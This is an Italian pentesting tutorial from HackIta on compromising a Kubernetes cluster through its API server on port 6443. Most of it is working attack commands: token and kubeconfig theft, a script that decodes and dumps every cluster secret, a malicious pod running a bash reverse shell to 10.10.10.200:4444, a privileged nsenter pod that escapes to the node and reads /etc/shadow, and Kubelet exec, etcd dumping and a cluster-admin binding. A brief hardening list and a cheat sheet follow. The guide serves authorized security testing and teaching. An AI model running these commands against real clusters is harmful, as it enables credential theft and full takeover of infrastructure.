---
title: 'Porta 6443 Kubernetes API: Token, Secrets e Cluster Admin'
slug: porta-6443-kubernetes-api
description: >-
  Porta 6443 Kubernetes API nel pentest: token ServiceAccount, secret
  extraction, accesso ai pod, escalation a cluster-admin e compromissione del
  cluster.
image: /porta-6443-kubernetes-api.webp
draft: false
date: 2026-04-15T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - Kubernetes API
  - ServiceAccount Token
  - Cluster Admin
---

Il Kubernetes API Server è il cervello di ogni cluster Kubernetes: ogni operazione — dal deploy di un container alla lettura di un secret — passa attraverso la sua REST API sulla porta 6443 TCP (HTTPS). Nel penetration testing, un API server esposto o un ServiceAccount token rubato è il finding più critico in ambienti cloud-native: dà accesso a **tutti i secret** (credenziali database, API key, certificati TLS), a **tutti i container** (con possibilità di eseguire comandi dentro ciascuno), e alla capacità di **deployare container privilegiati** che danno accesso root ai nodi sottostanti — il classico [container escape](https://hackita.it/articoli/container-escape).

Nel 2026, Kubernetes è l'orchestratore dominante: AWS EKS, Azure AKS, Google GKE e cluster on-premise. Ogni cloud provider lo usa. Compromettere il Kubernetes API significa compromettere l'intera infrastruttura applicativa.

## Architettura Kubernetes

```
                         ┌─────────────────────────────┐
kubectl / API client ──► │ API Server (:6443)           │
                         │  ├── Authentication          │
                         │  ├── Authorization (RBAC)    │
                         │  └── Admission Control       │
                         └──────────────┬──────────────┘
                                        │
                    ┌───────────────────┼───────────────────┐
                    ▼                   ▼                   ▼
              ┌──────────┐       ┌──────────┐       ┌──────────┐
              │ Node 1   │       │ Node 2   │       │ Node 3   │
              │ kubelet  │       │ kubelet  │       │ kubelet  │
              │ Pod A    │       │ Pod B    │       │ Pod C    │
              │ Pod D    │       │ Pod E    │       │ Pod F    │
              └──────────┘       └──────────┘       └──────────┘
```

| Porta       | Servizio                 | Funzione                                   |
| ----------- | ------------------------ | ------------------------------------------ |
| **6443**    | API Server (HTTPS)       | Controllo completo del cluster             |
| 8443        | API Server (alternativa) | Alcune configurazioni                      |
| 10250       | Kubelet API              | Gestione pod sui nodi                      |
| 10255       | Kubelet read-only        | Info pod senza auth                        |
| 2379        | etcd                     | Database cluster (contiene TUTTI i secret) |
| 30000-32767 | NodePort                 | Servizi esposti sui nodi                   |

## 1. Enumerazione

### Nmap

```bash
nmap -sV -p 6443,8443,10250,10255,2379 10.10.10.40
```

```
PORT      STATE SERVICE    VERSION
6443/tcp  open  ssl/http   Kubernetes API Server
10250/tcp open  ssl/http   Kubelet API
```

### Test accesso anonimo

```bash
# Verifica se l'API accetta richieste non autenticate
curl -sk https://10.10.10.40:6443/api/v1/namespaces
```

```json
{
  "kind": "NamespaceList",
  "items": [
    {"metadata": {"name": "default"}},
    {"metadata": {"name": "kube-system"}},
    {"metadata": {"name": "production"}},
    {"metadata": {"name": "staging"}}
  ]
}
```

Se risponde con dati → **accesso anonimo attivo** (misconfiguration grave). Se `403 Forbidden` → serve autenticazione.

```bash
# Versione del cluster
curl -sk https://10.10.10.40:6443/version
```

```json
{
  "major": "1",
  "minor": "28",
  "gitVersion": "v1.28.4",
  "platform": "linux/amd64"
}
```

Versione esatta → cerca CVE.

### Verifica RBAC per utenti anonimi

```bash
# Cosa può fare l'utente anonimo?
curl -sk https://10.10.10.40:6443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
  -X POST -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}'
```

## 2. Token di Autenticazione

### Da dove arrivano i token

Kubernetes usa **ServiceAccount token** (JWT) per l'autenticazione. Si trovano:

```bash
# 1. Dentro ogni pod (montato automaticamente)
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# 2. Nei file kubeconfig di sviluppatori/admin
cat ~/.kube/config
find / -name "kubeconfig" -o -name ".kube" 2>/dev/null

# 3. Nei secret di Kubernetes stesso
# 4. In pipeline CI/CD (Jenkins, GitLab CI, GitHub Actions)
# 5. In variabili d'ambiente di container
# 6. Nei repository Git committati per errore
```

### Usare un token rubato

```bash
# Con curl
export TOKEN="eyJhbGciOiJSUzI1NiIs..."
curl -sk https://10.10.10.40:6443/api/v1/namespaces -H "Authorization: Bearer $TOKEN"
```

```bash
# Con kubectl
kubectl --server=https://10.10.10.40:6443 --token=$TOKEN --insecure-skip-tls-verify get pods -A
```

### Kubeconfig rubato

```bash
# Se trovi un file kubeconfig
export KUBECONFIG=/tmp/stolen_kubeconfig
kubectl get pods -A
kubectl get secrets -A
```

Un kubeconfig di un cluster admin → controllo totale.

## 3. Enumerazione del Cluster

Con accesso autenticato (token o kubeconfig):

```bash
# Tutti i namespace
kubectl get namespaces

# Tutti i pod in tutti i namespace
kubectl get pods -A -o wide
```

```
NAMESPACE     NAME                          READY   NODE        IP
production    webapp-5d4f8b9c7d-abc12       1/1     node-01     10.244.1.5
production    api-backend-7f6c9d8e5b-def34  1/1     node-02     10.244.2.3
production    payment-svc-8a7b6c5d4e-ghi56  1/1     node-01     10.244.1.8
kube-system   coredns-5d78c9869d-xyz98      1/1     node-03     10.244.3.2
staging       debug-pod-manual              1/1     node-02     10.244.2.9
```

```bash
# Tutti i servizi (con IP e porte)
kubectl get services -A

# Tutti i deployments
kubectl get deployments -A

# Tutti i nodi
kubectl get nodes -o wide
```

### Verifica i tuoi permessi

```bash
# Cosa posso fare?
kubectl auth can-i --list

# Posso creare pod? (= RCE)
kubectl auth can-i create pods

# Posso leggere i secret? (= credenziali)
kubectl auth can-i get secrets

# Posso fare tutto? (= cluster-admin)
kubectl auth can-i '*' '*'
```

## 4. Secret Extraction — Il Tesoro di Kubernetes

I Kubernetes Secrets contengono: credenziali database, API key, certificati TLS, token OAuth, chiavi di cifratura.

```bash
# Lista tutti i secret
kubectl get secrets -A
```

```
NAMESPACE    NAME                          TYPE
production   db-credentials                Opaque
production   stripe-api-key                Opaque
production   tls-cert-webapp               kubernetes.io/tls
production   aws-credentials               Opaque
kube-system  default-token-abc12           kubernetes.io/service-account-token
```

```bash
# Leggi un secret (base64 encoded)
kubectl get secret db-credentials -n production -o jsonpath='{.data}'
```

```json
{
  "DB_HOST": "ZGItcHJvZC5jb3JwLmludGVybmFs",
  "DB_USER": "d2ViYXBw",
  "DB_PASSWORD": "VzNiQXBwX0RCXzIwMjUh"
}
```

```bash
# Decode base64
echo "VzNiQXBwX0RCXzIwMjUh" | base64 -d
# W3bApp_DB_2025!
```

Credenziali [PostgreSQL](https://hackita.it/articoli/porta-5432-postgresql)/[MySQL](https://hackita.it/articoli/porta-3306-mysql) in chiaro.

```bash
# Dump TUTTI i secret in un colpo
kubectl get secrets -A -o json | python3 -c "
import json,base64,sys
data = json.load(sys.stdin)
for item in data['items']:
    ns = item['metadata']['namespace']
    name = item['metadata']['name']
    if 'data' in item and item['data']:
        print(f'\n=== {ns}/{name} ===')
        for k,v in item['data'].items():
            try: print(f'  {k}: {base64.b64decode(v).decode()}')
            except: print(f'  {k}: [binary data]')
"
```

Script che decodifica ed espone ogni credenziale del cluster.

```bash
# AWS credentials
kubectl get secret aws-credentials -n production -o jsonpath='{.data.AWS_SECRET_ACCESS_KEY}' | base64 -d
```

→ [AWS privilege escalation](https://hackita.it/articoli/aws-privilege-escalation).

## 5. RCE — Eseguire Comandi nei Pod

```bash
# Esegui un comando in un pod
kubectl exec -it webapp-5d4f8b9c7d-abc12 -n production -- /bin/bash
```

```
root@webapp-5d4f8b9c7d-abc12:/app# id
uid=0(root) gid=0(root) groups=0(root)
```

Sei root dentro il container dell'applicazione. Da qui:

```bash
# Variabili d'ambiente (spesso contengono credenziali)
env | grep -iE "password|secret|token|key|database"

# Filesystem dell'app
cat /app/.env
cat /app/config/database.yml

# Token ServiceAccount (per muoversi nel cluster)
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

### Deploy di un pod malevolo

Se puoi creare pod (ma non exec in quelli esistenti):

```bash
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: attacker-pod
  namespace: default
spec:
  containers:
  - name: pwn
    image: ubuntu
    command: ["bash", "-c", "bash -i >& /dev/tcp/10.10.10.200/4444 0>&1"]
EOF
```

## 6. Container Escape — Dal Pod al Nodo

### Pod privilegiato

Se puoi creare pod privilegiati → accesso diretto al filesystem del nodo:

```bash
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: node-pwn
  namespace: default
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: pwn
    image: ubuntu
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host-fs
    command: ["nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid", "bash"]
  volumes:
  - name: host-fs
    hostPath:
      path: /
  nodeSelector:
    kubernetes.io/hostname: node-01
EOF
```

```bash
kubectl exec -it node-pwn -- bash
```

```
root@node-01:/# id
uid=0(root) gid=0(root)
root@node-01:/# cat /etc/shadow
```

**Root sul nodo** — sei uscito dal container. Ora: dump credenziali di tutti i pod sul nodo, accesso alla rete dell'host, pivoting verso altri nodi e servizi.

Per la guida completa: [Container Escape](https://hackita.it/articoli/container-escape).

## 7. etcd — Il Database dei Secret (porta 2379)

Se etcd è esposto:

```bash
# Leggi TUTTI i secret direttamente da etcd
etcdctl --endpoints=https://10.10.10.40:2379 \
  --cert=/tmp/etcd-cert.pem --key=/tmp/etcd-key.pem --cacert=/tmp/ca.pem \
  get / --prefix --keys-only | grep secret

etcdctl ... get /registry/secrets/production/db-credentials
```

etcd contiene lo stato completo del cluster — ogni secret, ogni configurazione, ogni token.

## 8. Kubelet API (porta 10250)

Se la Kubelet API è esposta:

```bash
# Lista pod sul nodo
curl -sk https://10.10.10.41:10250/pods | python3 -m json.tool

# Esegui comandi in un pod via Kubelet (bypass API server RBAC!)
curl -sk https://10.10.10.41:10250/run/production/webapp-abc12/webapp \
  -d "cmd=id"
```

Kubelet è un path alternativo: bypassa l'RBAC dell'API server e esegue comandi direttamente sul nodo.

## 9. Privilege Escalation a Cluster-Admin

### Da ServiceAccount limitato a cluster-admin

```bash
# Se puoi creare ClusterRoleBinding
kubectl create clusterrolebinding pwn --clusterrole=cluster-admin --serviceaccount=default:default
```

```bash
# Se puoi creare pod nel namespace kube-system
# I pod in kube-system spesso hanno SA con permessi elevati
kubectl get sa -n kube-system
kubectl get clusterrolebinding -o json | grep -A5 "kube-system"
```

```bash
# Se hai accesso al token di un SA privilegiato
# Cerca token montati in pod del kube-system
kubectl exec -it coredns-pod -n kube-system -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

## 10. Detection & Hardening

* **RBAC restrittivo** — principio del minimo privilegio per ogni ServiceAccount
* **Non esporre l'API server su Internet** — accesso solo via VPN o IP whitelist
* **Disabilita accesso anonimo** — `--anonymous-auth=false`
* **Network Policies** — limita la comunicazione tra namespace
* **Pod Security Standards** — blocca pod privilegiati, hostPID, hostNetwork
* **Ruota i ServiceAccount token** — non usare token statici
* **Cifra etcd** — encryption at rest per i secret
* **Audit logging** — ogni richiesta all'API server loggata
* **Kubelet auth** — `--anonymous-auth=false` e `--authorization-mode=Webhook`
* **Non montare SA token automaticamente** — `automountServiceAccountToken: false`
* **OPA/Gatekeeper** — policy engine per bloccare configurazioni pericolose

## 11. Cheat Sheet Finale

| Azione           | Comando                                                                         |
| ---------------- | ------------------------------------------------------------------------------- |
| Nmap             | `nmap -sV -p 6443,10250,2379 target`                                            |
| Versione         | `curl -sk https://target:6443/version`                                          |
| Test anonimo     | `curl -sk https://target:6443/api/v1/namespaces`                                |
| Con token        | `kubectl --token=TOKEN --server=https://target:6443 --insecure-skip-tls-verify` |
| Tutti i pod      | `kubectl get pods -A -o wide`                                                   |
| Tutti i secret   | `kubectl get secrets -A`                                                        |
| Leggi secret     | `kubectl get secret NAME -o jsonpath='{.data}' \| base64 -d`                    |
| Miei permessi    | `kubectl auth can-i --list`                                                     |
| Exec nel pod     | `kubectl exec -it POD -n NS -- /bin/bash`                                       |
| Env del pod      | `kubectl exec POD -- env`                                                       |
| SA token         | `cat /var/run/secrets/kubernetes.io/serviceaccount/token`                       |
| Pod privilegiato | `kubectl apply -f priv-pod.yaml`                                                |
| Kubelet pods     | `curl -sk https://node:10250/pods`                                              |
| Kubelet exec     | `curl -sk https://node:10250/run/NS/POD/CONTAINER -d "cmd=id"`                  |
| etcd secrets     | `etcdctl get /registry/secrets/ --prefix`                                       |

***

Riferimento: Kubernetes Security documentation, HackTricks Kubernetes, Bishop Fox Kubernetes pentesting. Uso esclusivo in ambienti autorizzati. [https://hackviser.com/tactics/pentesting/services/kubernetes](https://hackviser.com/tactics/pentesting/services/kubernetes)

> Questo progetto vive grazie alla community. [Supporta HackIta](https://hackita.it/supporto) per mantenere le guide gratuite, oppure investi nella tua crescita con la [formazione 1:1 in ethical hacking](https://hackita.it/formazione).
